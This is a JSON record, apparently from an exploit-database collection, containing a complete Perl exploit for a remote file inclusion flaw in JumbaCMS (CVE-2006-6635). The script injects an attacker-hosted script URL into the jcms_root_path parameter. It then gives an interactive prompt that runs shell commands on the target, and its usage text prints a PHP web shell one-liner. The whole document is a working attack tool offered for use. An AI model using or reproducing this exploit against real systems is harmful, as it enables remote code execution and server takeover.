{
  "id": "2628",
  "title": "JumbaCMS 0.0.1 - &#039;/includes/functions.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6635",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#\r\n# JumbaCMS Build 2 Remote Command Execution Vulnerability\r\n#\r\n# Risk : High (Remote Code Execution)\r\n#\r\n# Url: http://jumbacms.googlecode.com/svn/trunk/\r\n#\r\n# Exploit:\r\n#   http://site.com/[path]/includes/functions.php?jcms_root_path=[Evil_Script]\r\n# w0rks only if php<5 ! c0de:\r\n#      if (version_compare(phpversion(), \"5.0.0\", \"<\"))\r\n#         {\r\n#\t     include($jcms_root_path.\"includes/file_put_contents.\".$phpEx);\r\n#          }\r\n#\r\n# (c)oded and f0und3d by Kw3[R]Ln <ciriboflacs[AT]YaHOo.com>\r\n#\r\n# Romanian Security Team .: hTTp://RST-CREW.NET :.\r\n#\r\n# Shoutz to [Oo], str0ke, th0r and all members of RST !\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"...........................[RST]...............................\\n\";\r\nprint \".                                                             .\\n\";\r\nprint \".        JumbaCMS remote Command Execution Vulnerability      .\\n\";\r\nprint \".                                                             .\\n\";\r\nprint \"...............................................................\\n\";\r\nprint \".       Romanian Security Team -> hTTp://RST-CREW.NET         .\\n\";\r\nprint \".       [c]oded by Kw3rLN - kw3rln[AT]rst-crew.net            .\\n\";\r\nprint \"...............................................................\\n\\n\";\r\n\r\nmy $kw3,$path,$shell,$conexiune,$cmd,$data ;\r\n\r\n\r\nif ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}\r\n\r\n$path = $ARGV[0];\r\nchomp($path);\r\n$shell = $ARGV[1];\r\nchomp($shell);\r\n\r\n$path = $path.\"/includes/functions.php\";\r\n\r\n\r\nsub usage(){\r\n\tprint \"Usage    : perl $0 host/path http://site.com/cmd.txt\\n\\n\";\r\n\tprint \"Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\\n\\n\";\r\n        print 'Shell    : <?php ob_clean();ini_set(\"max_execution_time\",0);passthru($_GET[\"cmd\"]);die;?>';\r\n           }\r\n\r\nwhile ()\r\n{\r\nprint \"[kw3rln].[rst] :~\\$ \";\r\nchomp($cmd=<STDIN>);\r\nif ($cmd eq \"exit\") { exit(0);}\r\n\r\n$kw3 = $path.\"?jcms_root_path=\".$shell.\"?&cmd=\".$cmd;\r\nif ($cmd eq \"\")\r\n  { print \"Enter your command !\\n\"; }\r\nelse\r\n  { $data=get($kw3); print $data ; }\r\n}\r\n\r\n# milw0rm.com [2006-10-23]",
  "url": "https://www.exploit-db.com/exploits/2628"
}